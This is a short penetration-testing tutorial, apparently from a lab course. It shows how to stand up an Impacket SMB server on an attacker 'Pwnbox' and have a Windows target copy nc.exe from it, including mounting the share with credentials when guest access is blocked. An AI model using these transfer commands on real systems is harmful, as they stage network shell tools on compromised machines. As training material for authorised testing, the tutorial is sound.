----
The Server Message Block protocol (SMB protocol) that runs on port TCP/445 is common in enterprise networks where Windows services are running. It enables applications and users to transfer files to and from remote servers.

We can use SMB to download files from our Pwnbox easily. We need to create an SMB server in our Pwnbox with [smbserver.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/smbserver.py) from Impacket and then use `copy`, `move`, PowerShell `Copy-Item` , or any other tool that allows connection to SMB.

- First create the SMB server

```bash
sudo impacket-smbserver share -smb2support /tmp/smbshare
```

- To download a file from the SMB server we can use the following command
```powershell
copy \\<SMB-ip>\share\nc.exe
```

New versions of Windows block unauthenticated guest access. To transfer files in this scenario, we can set a username and password using our Impacket SMB server and mount the SMB server on our target.

- Create share with username and password
```bash
sudo impacket-smbserver share -smb2support /tmp/share -user test -password test
```

- Mount the SMB server to the target
```powershell
net use n: \\<SMB-ip>\share /user:test test
```

```powershell
copy n:\nc.exe
```